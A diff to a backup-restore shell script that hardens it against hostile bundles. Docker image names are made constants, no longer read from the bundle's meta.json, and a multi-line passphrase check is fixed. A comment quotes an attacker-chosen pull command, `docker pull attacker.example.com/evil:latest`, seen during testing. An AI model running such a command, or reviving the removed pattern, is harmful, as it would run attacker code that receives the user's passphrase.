@@ -33,6 +33,10 @@ OUT=""
 PASSFILE=""
 VERIFY_ONLY=0
 
+# A literal newline, for the multi-line checks below.
+NOVA_NL='
+'
+
 # nova_restore.py's exit codes, which is how this script tells "this machine
 # cannot decrypt" (try the next backend) from "this passphrase or this file
 # is wrong" (stop, and say so).
@@ -103,28 +107,35 @@ tar -xf "$BUNDLE_ABS" -C "$WORK" \
   || die "$BUNDLE_BASE does not carry the cleartext members a Nova bundle has
   (README.txt, nova_restore.py, restore.sh, kat.sha256, kat.enc, meta.json)"
 
-META="$WORK/meta.json"
-[ -f "$META" ] || die "$BUNDLE_BASE has no meta.json"
+# meta.json is extracted because §5.1 says a bundle carries it and its absence
+# means this is not a Nova bundle. NOTHING IN THIS SCRIPT READS IT. The one
+# value anything reads out of it is the advisory passphrase fingerprint, in
+# nova_restore.py, which is printed and never acted on.
 
-# One flat string field out of meta.json, without a JSON parser. meta.json is
-# written by novabundle.py with json.dumps(indent=2), so every scalar is on
-# its own line — and nothing here DECIDES anything: meta.json only chooses
-# which images to try, and a wrong choice fails the KAT and refuses.
-meta_str() {
-  sed -n 's/^[[:space:]]*"'"$1"'"[[:space:]]*:[[:space:]]*"\([^"]*\)".*$/\1/p' "$META" | head -1
-}
-
-# The string items of one flat JSON array, space separated.
-meta_list() {
-  sed -n '/^[[:space:]]*"'"$1"'"[[:space:]]*:[[:space:]]*\[/,/\]/p' "$META" \
-    | sed -n 's/^[[:space:]]*"\([^"]*\)".*$/\1/p' \
-    | tr '\n' ' '
-}
-
-CRYPTO_IMAGE=$(meta_str crypto_image)
-FALLBACK_IMAGE=$(meta_str fallback_image)
-NEEDS_IMAGES=$(meta_list needs_images)
-[ -n "$FALLBACK_IMAGE" ] || FALLBACK_IMAGE="python:3.12-slim"
+# ── the images, which the BUNDLE does not get to choose ────────────────────
+#
+# These are constants in this script, not values read out of the file being
+# opened. Backends 3 and 4 `docker pull` an image, run it, and feed the
+# operator's passphrase to it on stdin — so whoever names the image names the
+# code that sees the passphrase. Reading it from cleartext meta.json made a
+# hostile bundle able to do exactly that: measured with a recording docker
+# stub, `docker pull attacker.example.com/evil:latest`.
+#
+# The known-answer test does NOT cover this and the comment that used to sit
+# here claiming it did was false: the KAT runs INSIDE the chosen image, so a
+# passing KAT says the image can decrypt, never that it should have run.
+#
+# An operator who needs a different image says so himself, in his own shell,
+# where the value comes from him and not from the file:
+#
+#     NOVA_CRYPTO_IMAGE=my-core NOVA_FALLBACK_IMAGE=python:3.13-slim \
+#         sh restore.sh <bundle>
+#
+# The design (§7.3, §5.4) says these come from meta.json. That is the one
+# place the design is wrong, and the report argues it.
+CRYPTO_IMAGE="${NOVA_CRYPTO_IMAGE:-nova-core}"
+FALLBACK_IMAGE="${NOVA_FALLBACK_IMAGE:-python:3.12-slim}"
+NEEDS_IMAGES="postgres:16 $FALLBACK_IMAGE"
 
 # ── the passphrase: read once, never in argv, never in an environment the
 #    container can be inspected for ──────────────────────────────────────────
@@ -132,11 +143,16 @@ if [ -n "$PASSFILE" ]; then
   [ -f "$PASSFILE" ] || die "no such passphrase file: $PASSFILE" 2
   PASS=$(cat "$PASSFILE")
   # nova_restore.py reads the FIRST LINE of stdin, so a multi-line file would
-  # be silently cut rather than refused.
-  if [ "$(printf '%s' "$PASS" | wc -l | tr -d ' ')" != "0" ]; then
-    die "$PASSFILE holds more than one line. The passphrase is one line; a file like
+  # be silently cut rather than refused. `$(printf '\n')` strips its own
+  # newline, so a case pattern built that way is `*""*` and matches
+  # everything — the newline is a literal inside single quotes instead, which
+  # also keeps this off `wc`.
+  case "$PASS" in
+    *"$NOVA_NL"*)
+      die "$PASSFILE holds more than one line. The passphrase is one line; a file like
   this would be silently cut at the first newline." 2
-  fi
+      ;;
+  esac
 elif [ -n "${NOVA_BACKUP_PASSPHRASE:-}" ]; then
   PASS="$NOVA_BACKUP_PASSPHRASE"
 elif [ -t 0 ]; then
@@ -269,7 +285,7 @@ Error: no way to decrypt this bundle on this machine.
   Or, with docker and a registry it can reach:
 
 ADVICE
-  for image in $NEEDS_IMAGES $FALLBACK_IMAGE; do
+  for image in $NEEDS_IMAGES; do
     printf '    docker pull %s\n' "$image" >&2
   done
   cat >&2 <<'ADVICE2'
